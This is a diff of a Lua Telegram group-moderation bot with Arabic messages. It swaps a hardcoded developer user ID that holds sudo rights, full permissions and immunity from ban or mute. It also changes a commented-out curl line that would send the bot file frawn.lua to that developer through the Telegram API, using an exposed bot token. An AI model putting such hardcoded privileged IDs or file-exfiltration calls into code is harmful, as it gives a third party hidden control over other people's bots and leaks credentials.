@@ -171,7 +171,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1779150039,1944028567}   
+sudo_users = {SUDO,1779150039,1970574026}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -261,7 +261,7 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1944028567) then  
+if tonumber(user_id) == tonumber(1970574026) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1635597460) then
 var = true  
@@ -299,7 +299,7 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1779150039) then  
 var = 'المطور يوسف الجمد'
-elseif tonumber(user_id) == tonumber(1944028567) then
+elseif tonumber(user_id) == tonumber(1970574026) then
 var = 'المبرمج فرعون الكبير'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -3960,7 +3960,7 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1944028567) then
+if result.sender_user_id_ == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, " ❍ لا يمكنك حظر المرمج الكبير فرعون\n")
 return false 
 end
@@ -4072,7 +4072,7 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1944028567) then
+if result.sender_user_id_ == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, " ❍ لا يمكنك كتم مبرمج السورس\n")
 return false 
 end
@@ -13299,7 +13299,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
---local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1944028567 ..'" -F "document=@'..'frawn.lua'..'"' io.popen(curl)
+--local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1970574026 ..'" -F "document=@'..'frawn.lua'..'"' io.popen(curl)
 ------------------------------------------------------------------------
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
